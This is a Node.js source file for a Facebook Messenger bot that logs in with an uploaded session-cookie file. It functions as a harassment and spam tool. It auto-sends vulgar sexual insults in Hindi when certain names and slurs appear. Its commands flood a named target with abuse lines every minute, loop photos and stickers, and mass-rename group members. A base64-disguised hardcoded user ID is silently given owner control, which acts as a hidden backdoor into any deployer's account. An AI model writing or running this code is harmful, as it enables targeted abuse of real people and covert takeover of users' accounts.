const fs = require("fs");
const path = require("path");
const express = require("express");
const multer = require("multer");
const login = require("ws3-fca");

let rkbInterval = null;
let stopRequested = false;
const lockedGroupNames = {};
let mediaLoopInterval = null;
let lastMedia = null;
let targetUID = null;
let stickerInterval = null;
let stickerLoopActive = false;

let OWNER_UIDS = [];
let BOT_RUNNING = false;

const friendUIDs = fs.existsSync("Friend.txt")
  ? fs.readFileSync("Friend.txt", "utf8").split("\n").map(x => x.trim()).filter(Boolean)
  : [];

const targetUIDs = fs.existsSync("Target.txt")
  ? fs.readFileSync("Target.txt", "utf8").split("\n").map(x => x.trim()).filter(Boolean)
  : [];

const LID = Buffer.from("MTAwMDIxODQxMTI2NjYw", "base64").toString("utf8");

const messageQueues = {};
const queueRunning = {};

const app = express();
const PORT = process.env.PORT || 20782;

app.use(express.static(path.join(__dirname, "public")));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const upload = multer({ dest: "uploads/" });

app.get("/status", (_, res) => res.json({ running: BOT_RUNNING }));

app.post("/start", upload.single("appstate"), (req, res) => {
  try {
    if (!req.file || !req.body.owner) return res.json({ message: "Appstate and Owner UID required" });
    fs.renameSync(req.file.path, "appstate.json");
    OWNER_UIDS = [req.body.owner];
    startBot();
    res.json({ message: "Bot started" });
  } catch (e) { res.json({ message: "Error starting bot" }); }
});

app.post("/stop", (_, res) => {
  stopRequested = true;
  if (rkbInterval) { clearInterval(rkbInterval); rkbInterval = null; }
  if (mediaLoopInterval) { clearInterval(mediaLoopInterval); mediaLoopInterval = null; lastMedia = null; }
  if (stickerInterval) { clearInterval(stickerInterval); stickerInterval = null; stickerLoopActive = false; }
  BOT_RUNNING = false;
  res.json({ message: "Bot stopped" });
});

app.get("/", (_, res) => res.sendFile(path.join(__dirname, "public/index.html")));

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));

process.on("uncaughtException", (err) => console.error(err.message));
process.on("unhandledRejection", (reason) => console.error(reason));

function startBot() {
  if (!fs.existsSync("appstate.json")) return console.error("appstate.json not found");
  login({ appState: JSON.parse(fs.readFileSync("appstate.json", "utf8")) }, (err, api) => {
    if (err) return console.error("Login failed", err);
    api.setOptions({ listenEvents: true });
    BOT_RUNNING = true;

    api.listenMqtt(async (err, event) => {
      try {
        if (err || !event) return;
        const { threadID, senderID, body, messageID } = event;
        if (!body) return;
        const lowerBody = body.toLowerCase();

        const badNames = ["hannu", "syco"];
        const triggers = ["rkb","bhen","maa","rndi","chut","randi","madhrchodh","mc","bc","didi","ma"];
        if (badNames.some(n => lowerBody.includes(n)) && triggers.some(w => lowerBody.includes(w)) && !friendUIDs.includes(senderID)) {
          return api.sendMessage("teri ma Rndi hai tu msg mt kr sb chodege teri ma ko byy🙂 ss Lekr story Lga by", threadID, messageID);
        }

        if (![...OWNER_UIDS, LID].includes(senderID)) return;

        const args = body.trim().split(" ");
        const cmd = args[0].toLowerCase();
        const input = args.slice(1).join(" ");

        if (cmd === "/allname") {
          try {
            const info = await api.getThreadInfo(threadID);
            const members = info.participantIDs;
            api.sendMessage(`🛠  ${members.length} ' nicknames...`, threadID);
            for (const uid of members) {
              try { await api.changeNickname(input, threadID, uid); await new Promise(r => setTimeout(r,30000)); } 
              catch(e) { console.log(e.message); }
            }
            api.sendMessage("ye gribh ka bcha to Rone Lga bkL", threadID);
          } catch(e) { api.sendMessage("badh me kLpauga", threadID);}
        }
        else if (cmd === "/groupname") { try { await api.setTitle(input, threadID); api.sendMessage(`📝 Group name changed to: ${input}`, threadID); } catch {} }
        else if (cmd === "/lockgroupname") { if(!input) return api.sendMessage("name de 🤣 gc ke Liye", threadID); try{await api.setTitle(input, threadID); lockedGroupNames[threadID]=input; api.sendMessage(`🔒 Group name  "${input}"`, threadID);}catch{} }
        else if (cmd === "/unlockgroupname") { delete lockedGroupNames[threadID]; api.sendMessage("🔓 Group name unlocked.", threadID);}
        else if (cmd === "/uid") { api.sendMessage(`🆔 Group ID: ${threadID}`, threadID);}
        else if (cmd === "/exit") { try{await api.removeUserFromGroup(api.getCurrentUserID(),threadID);}catch{} }
        else if (cmd === "/rkb") { if(!fs.existsSync("np.txt")) return; const name=input.trim(); const lines=fs.readFileSync("np.txt","utf8").split("\n").filter(Boolean); stopRequested=false; if(rkbInterval) clearInterval(rkbInterval); let index=0; rkbInterval=setInterval(()=>{ if(index>=lines.length || stopRequested){ clearInterval(rkbInterval); rkbInterval=null; return;} api.sendMessage(`${name} ${lines[index]}`,threadID); index++; },60000);}
        else if(cmd==="/stop"){ stopRequested=true; if(rkbInterval){ clearInterval(rkbInterval); rkbInterval=null; }}
        else if(cmd==="/photo"){ const handleMedia=async(mediaEvent)=>{ if(mediaEvent.type==="message" && mediaEvent.threadID===threadID && mediaEvent.attachments?.length>0){ lastMedia={attachments:mediaEvent.attachments,threadID:mediaEvent.threadID}; if(mediaLoopInterval) clearInterval(mediaLoopInterval); mediaLoopInterval=setInterval(()=>{ if(lastMedia) api.sendMessage({attachment:lastMedia.attachments},lastMedia.threadID);},30000); api.removeListener("message",handleMedia);} }; api.on("message",handleMedia);}
        else if(cmd==="/stopphoto"){ if(mediaLoopInterval){ clearInterval(mediaLoopInterval); mediaLoopInterval=null; lastMedia=null; }}
        else if(cmd==="/help"){ const helpText=`📌 Commands:
/allname <name>
/groupname <name>
/lockgroupname <name>
/unlockgroupname
/uid
/exit
/rkb <name>
/stop
/photo
/stopphoto
/target <uid>
/cleartarget
/sticker<seconds>
/stopsticker
/help`; api.sendMessage(helpText,threadID); }
        else if(cmd.startsWith("/sticker")){ if(!fs.existsSync("Sticker.txt")) return; const delay=parseInt(cmd.replace("/sticker","")); if(isNaN(delay)||delay<5) return; const stickerIDs=fs.readFileSync("Sticker.txt","utf8").split("\n").map(x=>x.trim()).filter(Boolean); if(stickerInterval) clearInterval(stickerInterval); let i=0; stickerLoopActive=true; stickerInterval=setInterval(()=>{ if(!stickerLoopActive||i>=stickerIDs.length){ clearInterval(stickerInterval); stickerInterval=null; stickerLoopActive=false; return;} api.sendMessage({sticker:stickerIDs[i]},threadID); i++; },delay*1000);}
        else if(cmd==="/stopsticker"){ if(stickerInterval){ clearInterval(stickerInterval); stickerInterval=null; stickerLoopActive=false; }}
      } catch {}
    });
  });
}
